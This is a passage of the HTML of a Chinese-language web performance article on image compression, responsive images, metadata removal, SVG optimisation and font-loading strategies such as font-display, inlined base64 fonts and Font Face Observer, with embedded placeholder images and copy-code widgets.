url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsSAAALEgHS3X78AAABtElEQVQY02MQkVSQkldX0TDUNLC1dPTT1DMRlVZW0zJS07Vy94/RN7aUkFHT1DHVNrJz84s2t3ESFldQ1TAEcnXNXRlkZVT09C0MLDxMHIJcwlINDSy0tE0MLD2Nbf2Dk4v0DS00NAz1LTwMbfwCEgttbV011IFKPMzsA239Exki2HiDNLQMjU0jQ8LKfCLSpBUDVNUMTczCA4NbotOTpJUClFWNTMxCg4Jro1LzNA1C5BSMTcyCgoJLPUMYipn4NPm5owLdZ0yd2a9jViMqp8bLERXkMWPazBnWLg0icqpcbGHejrNmzJpk7dyrpKPDyebnbDF7/sJmLWMGNVYObU2NupbW+YtXhWjqmklJqygrN3d1z1uwLN7M0kJKRkVRoaapefGK9bHG5q5qGvLS0qVVVWs27fRWVmdgZGOVkJWxdnCIjAyMiw0Xl5cTFhezdXEJDfXNyUyRVVIUFBO1dXIOCwvIzkxW09flFRSwtLcPjwyOCPFhUOXi1ufkVuXhtZAWzYgJsVRU0mJmVeXjM5UQLstJsVZR1WRiUePnNxITLM9J9jAyVmdg0uDnNxYTSgnzAQD1SGd06TyS0AAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 13 42 25" title="" data-src="/static/2021-07-22-13-42-25-7fa8c049563260c1a64645c1a1b65188-fee1c.png" data-srcset="/static/2021-07-22-13-42-25-7fa8c049563260c1a64645c1a1b65188-a67b7.png 200w,\n/static/2021-07-22-13-42-25-7fa8c049563260c1a64645c1a1b65188-0b187.png 400w,\n/static/2021-07-22-13-42-25-7fa8c049563260c1a64645c1a1b65188-fee1c.png 800w,\n/static/2021-07-22-13-42-25-7fa8c049563260c1a64645c1a1b65188-fa1ac.png 1118w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>不过渐进式 JPEG 的解码速度会慢于基线 JPEG，所以还是需要综合考虑 CPU、网络等情况，在实际的用户体验之上做权衡。</p>\n</li>\n</ol>\n<h4 id="图片质量的权衡"><a href="#%E5%9B%BE%E7%89%87%E8%B4%A8%E9%87%8F%E7%9A%84%E6%9D%83%E8%A1%A1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>图片质量的权衡</h4>\n<p>图片的压缩一般可以分为有损压缩（lossy compression）和无损压缩（lossless compression）。顾名思义，有损压缩下，会损失一定的图片质量，无损压缩则能够在保证图片质量的前提下压缩数据大小。不过，无损压缩一般可以带来更可观的体积缩减。在使用有损压缩时，一般我们可以指定一个 0-100 的压缩质量。在大多数情况下，相较于 100 质量系数的压缩，80 ～ 85 的质量系数可以带来 30 ～ 40% 的大小缩减，同时对图片效果影响较小，即人眼不易分辨出质量效果的差异。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-13-43-06-93762a21a85f13df44b7ac53a3beb461-36d66.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 28.56272838002436%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABL0lEQVQY02P49PHj//////379590wLDl+NHtJ49vOnFk7+Xz1x7e2Xr8yI7TpzYfP7Tt7KlrT+7vOXN826lTW48f3nTq+PUnDw5fOL391MkdJ45sPHb45M1rDJYepnn5gQVlIR1LpqVXF2haqWXlhxQU+TfObq+a2K5tpx2f6ldY5FfaXTx59WIDJ4OASNeCAt+yprTelfMYCgK1tuYotwUrxUX5FNSWxnvrrMtUmxGjHO1nU9ZUHRFkuzhFbWWqaoyrVk1rfXiUd1+U2sZMtTwvtbScFIZDx4/funPzzKVL569evnrj2uHjx6/funHh6pVTFy7cuH3z4LFjV65fvXrj+rFz5+49vHfs9OmLV67cuHXj9KXL127fYEAOgL9//gIBhA0Mwt+/f/+DcbECAEHoBalXSYQ5AAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 13 43 06" title="" data-src="/static/2021-07-22-13-43-06-93762a21a85f13df44b7ac53a3beb461-fee1c.png" data-srcset="/static/2021-07-22-13-43-06-93762a21a85f13df44b7ac53a3beb461-a67b7.png 200w,\n/static/2021-07-22-13-43-06-93762a21a85f13df44b7ac53a3beb461-0b187.png 400w,\n/static/2021-07-22-13-43-06-93762a21a85f13df44b7ac53a3beb461-fee1c.png 800w,\n/static/2021-07-22-13-43-06-93762a21a85f13df44b7ac53a3beb461-b1a91.png 1200w,\n/static/2021-07-22-13-43-06-93762a21a85f13df44b7ac53a3beb461-95179.png 1600w,\n/static/2021-07-22-13-43-06-93762a21a85f13df44b7ac53a3beb461-36d66.png 1642w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>处理图片压缩可以使用 imagemin 这样的工具，也可以进一步将它集成至 webpack、Gulp、Grunt 这样的自动化工具中。</p>\n<h4 id="使用合适的大小和分辨率"><a href="#%E4%BD%BF%E7%94%A8%E5%90%88%E9%80%82%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%92%8C%E5%88%86%E8%BE%A8%E7%8E%87" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用合适的大小和分辨率</h4>\n<p>由于移动端的发展，屏幕尺寸更加多样化了。同一套设计在不同尺寸、像素比的屏幕上可能需要不同像素大小的图片来保证良好的展示效果；此外，响应式设计也会对不同屏幕上最佳的图片尺寸有不同的要求。</p>\n<p>以往我们可能会在 1280px 宽度的屏幕上和 640px 宽度的屏幕上都使用一张 400px 的图，但很可能在 640px 上我们只需要 200px 大小的图片。另一方面，对于如今盛行的“2 倍屏”、“3 倍屏”也需要使用不同像素大小的资源。</p>\n<p>好在 HTML5 在 <code class="language-text">&lt;img&gt;</code> 元素上为我们提供了 srcset 和 sizes 属性，可以让浏览器根据屏幕信息选择需要展示的图片。</p>\n<html><head></head><body><div class="gatsby-code-button-container" data-toaster-id="14686699010501104000" data-toaster-class="gatsby-code-button-toaster" data-toaster-text-class="gatsby-code-button-toaster-text" data-toaster-text="复制成功" data-toaster-duration="3500" onclick="copyToClipboard(`<img data-srcset=&quot;small.jpg 480w, large.jpg 1080w&quot; data-sizes=&quot;50w&quot; data-src=&quot;large.jpg&quot; />`, `14686699010501104000`)">\n              <div class="gatsby-code-button" title="html">\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div></body></html>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>small.jpg 480w, large.jpg 1080w<span class="token punctuation">"</span></span> <span class="token attr-name">sizes</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50w<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>large.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<h4 id="删除冗余的图片信息"><a href="#%E5%88%A0%E9%99%A4%E5%86%97%E4%BD%99%E7%9A%84%E5%9B%BE%E7%89%87%E4%BF%A1%E6%81%AF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>删除冗余的图片信息</h4>\n<p>你也许不知道，很多图片含有一些非“视觉化”的元信息（metadata），带上它们可会导致体积增大与安全风险。元信息包括图片的 DPI、相机品牌、拍摄时的 GPS 等，可能导致 JPEG 图片大小增加 15%。同时，其中的一些隐私信息也可能会带来安全风险。</p>\n<p>所以如果不需要的情况下，可以使用像 imageOptim 这样的工具来移除隐私与非关键的元信息。</p>\n<h4 id="svg-压缩"><a href="#svg-%E5%8E%8B%E7%BC%A9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SVG 压缩</h4>\n<p>合适的场景下可以使用 SVG。针对 SVG 我们也可以进行一些压缩。压缩包括了两个方面：</p>\n<p>首先，与图片不同，图片是二进制形式的文件，而 SVG 作为一种 XML 文本，同样是适合使用 gzip 压缩的。</p>\n<p>其次，SVG 本身的信息、数据是可以压缩的，例如用相比用 <code class="language-text">&lt;path&gt;</code> 画一个椭圆，直接使用 <code class="language-text">&lt;ellipse&gt;</code> 可以节省文本长度。关于信息的“压缩”还有更多可以优化的点。SVGGO 是一个可以集成到我们构建流中的 NodeJS 工具，它能帮助我们进行 SVG 的优化。当然你也可以使用它提供的 Web 服务。</p>\n<h3 id="缓存-2"><a href="#%E7%BC%93%E5%AD%98-2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>缓存</h3>\n<p>与其他静态资源类似，我们仍然可以使用各类缓存策略来加速资源的加载。</p>\n<p>图片作为现代 Web 应用的重要部分，在资源占用上同样也不可忽视。可以发现，在上面提及的各类优化措施中，同时附带了相应的工具或类库。平时我们主要的精力会放在 CSS 与 JavaScript 的优化上，因此在图片优化上可能概念较为薄弱，自动化程度较低。如果你希望更好得去贯彻图片的相关优化，非常建议将自动化工具引入到构建流程中。</p>\n<p>除了上述的一些工具，这里再介绍两个非常好用的图片处理的自动化工具：Sharp 和 Jimp。</p>\n<h2 id="字体"><a href="#%E5%AD%97%E4%BD%93" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>字体</h2>\n<p>有些时候，内置的字体并不能满足我们的需求，如果我们希望使用一些更有设计性的字体，我们一般会使用 @font-face 来加载字体文件：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="71258127068039450000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`@font-face {\n  font-family: \'Samplefont\';\n  src: url(\'/static/samplefont.woff2\') format(\'woff2\'), url(\'/static/samplefont.woff\') format(\'woff\');\n}`, `71258127068039450000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>\n  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">\'Samplefont\'</span><span class="token punctuation">;</span>\n  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>\'/static/samplefont.woff2\'<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">\'woff2\'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>\'/static/samplefont.woff\'<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">\'woff\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>然而这种方式的一大问题在于，在字体加载的期间，浏览器页面是默认不展示文本内容的。即我们常说的 FOIT (Flash of Invisible Text)。在现代浏览器中，FOIT 持续至多 3 秒，会带来糟糕的用户体验。所以在字体这部分的性能优化中，主要关注点在于如何平滑的加载字体。下面有一些解决方案。</p>\n<h3 id="font-display"><a href="#font-display" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>font-display</h3>\n<p>你可以在 @font-face 中设置 font-display: swap，他可以让 FOIT 的默认行为变为 FOUT (Flash of Unstyled Text)，即先会使用默认字体样式展示文本，字体加载完毕后再将文本的字体样式进行替换。</p>\n<p>font-display 的取值包括 auto|block|swap|fallback|optional，不过目前该属性的兼容性一般。</p>\n<h3 id="内联字体"><a href="#%E5%86%85%E8%81%94%E5%AD%97%E4%BD%93" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>内联字体</h3>\n<p>我们在上一节介绍过，可以使用 base64 将图片“内联”到页面中。同样的，字体也可以使用这种方式，这样就避免异步加载字体时的 FOIT 或 FOUT。我们可以将字体文件转为 base64 的字符串，设置到 @font-face 里的 src 属性上：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="13872737339223319000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`@font-face {\n  font-family: \'Samplefont\';\n  src: url(\'data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAHyoABMAAAAA4XQAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABG…\')\n    format(\'woff2\');\n}`, `13872737339223319000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>\n  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">\'Samplefont\'</span><span class="token punctuation">;</span>\n  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>\'data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAHyoABMAAAAA4XQAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABG…\'<span class="token punctuation">)</span></span>\n    <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">\'woff2\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>但这种方式的局限性在于，在一个 @font-face 中只能加载一种字体类型。同时，与使用内联图片一样，这也会将本可以并行请求的数据量变为串行。</p>\n<h3 id="使用-css-font-loading-api"><a href="#%E4%BD%BF%E7%94%A8-css-font-loading-api" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 CSS Font Loading API</h3>\n<p>CSS Font Loading API 是浏览器提供的，可以用来自定义控制字体加载的 API。这样你就可以在 JavaScript 中进行字体的加载，等加载完成后，再将需要应用新字体的元素设置为对应的样式，例如添加一个对应的 className。这里介绍了如何使用 CSS Font Loading API。</p>\n<p>不过目前 CSS Font Loading API 的兼容性也不乐观。同时，由于一些困难也无法实现一个完美的 polyfill。因此如果想要使用类似的能力，可以考虑 Font Face Observer 这个库。基本的使用方式如下：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="26817550063250928000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`const font = new FontFaceObserver(\'Samplefont\');\n\nfont\n  .load(null, 5000)\n  .then(() => document.documentElement.classList.add(\'loaded\'), () => console.log(\'Font is not available\'));`, `26817550063250928000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">const</span> font <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FontFaceObserver</span><span class="token punctuation">(</span><span class="token string">\'Samplefont\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\nfont\n  <span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span>\n  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">\'loaded\'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">\'Font is not available\'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="18198954350480845000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`@font-face {\n  font-family: \'Samplefont\';\n  src: url(/static/samplefont.woff2) format(\'woff2\'), url(/static/samplefont.woff) format(\'woff\');\n}\n\nbody {\n  font-family: sans-serif;\n}\n\n.loaded h1 {\n  font-family: Samplefont, sans-serif;\n  font-weight: 700;\n}`, `18198954350480845000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>\n  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">\'Samplefont\'</span><span class="token punctuation">;</span>\n  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/samplefont.woff2<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">\'woff2\'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/samplefont.woff<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">\'woff\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n\n<span class="token selector">body</span> <span class="token punctuation">{</span>\n  <span class="token property">font-family</span><span class="token punctuation">:</span> sans-serif<span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n\n<span class="token selector">.loaded h1</span> <span class="token punctuation">{</span>\n  <span class="token property">font-family</span><span class="token punctuation">:</span> Samplefont<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>\n  <span class="token property">font-weight</span><span class="token punctuation">:</span> 700<span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id="foft"><a href="#foft" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>FOFT</h3>\n<p>在需要加载同一字体的粗体、斜体时，FOFT (Flash of Faux Text) 方法会非常有效。</p>\n<p>首先你需要了解的是，对于一种字体，它的斜体与粗体是有专门的字符集的；与此同时，如果你指定了某种字体的粗体，但浏览器没有加载，那么你可以使用 font-synthesis 属性来让浏览器帮你模拟。而当实际的粗体或斜体加载完毕后，再使用实际的字体集。</p>\n<p>具体实践起会借助上面提到的 CSS Font Loading API 或者 Font Face Observer，实现当字体加载完毕后的样式修改。</p>\n<p>了解完字体的优化措施你会发现，它们主要集中于如何通过加载策略来降低甚至消除 FOIT。当然上面提到的这些策略与技术你可以组合使用，以达到所需的优化效果。</p>\n<p>如果还想了解更多关于字体加载的问题，可以看看这篇文章里总结的<a href="https://www.zachleat.com/web/comprehensive-webfonts/" target="_blank" rel="nofollow noreferrer noopener">各类加载策略</a>，它还随文提供了相应的代码示例。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-23-00-22-33-2324ace05141e3a5fb8ac074ec7bda1b-05988.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 764px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 60.73298429319372%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsSAAALEgHS3X78AAABiUlEQVQoz6VST4sBcRieMZQpJ5SSmrmqwUk5EDm4uCjTNE4jxYnD5jQHJQrlz81+BJ/ARQkj4uAi38LcCAfFPjvTjl3a2trn8Pa8vb/33/P+COIFZrMZtlqtXi6X8/ncaDTgUhRlMplAfD7f4XDY7/fH4/E19/MdbCqVetfA8zxcZJIkCeLxePr9frfbRYj4F0gN+ki9Xm+z2ex2u1gslslkQLbbbS6XC4fD8/l8Op22Wi2WZdfr9XK5XK1WjxKwWG88Hi8Wi0gkkk6nkTCZTERRhDubzcCbzSbDMIqijEYjRAmv1xsIBCADTdNut9vv93McZ7PZ7HY7p8HlchnVn6Gq6l1DMBgcDAa32w0capXLZZDr9dputw0VnyEIQjablSTJ4XBEo1FsmM/nIWkoFKpUKrIsY/9fO7/CYrHo++sTdTqdp87UFx7MqK0rH4/H6/V6rVZLJBJ/6pxMJt80QEWjyvejwjqdzmKxWCqVYH8EhsOhPmqhUIBrtVrxVY0SOsE58OB0OkHaD0zLqMfkFw0/AAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 23 00 22 33" title="" data-src="/static/2021-07-23-00-22-33-2324ace05141e3a5fb8ac074ec7bda1b-05988.png" data-srcset="/static/2021-07-23-00-22-33-2324ace05141e3a5fb8ac074ec7bda1b-dc8ef.png 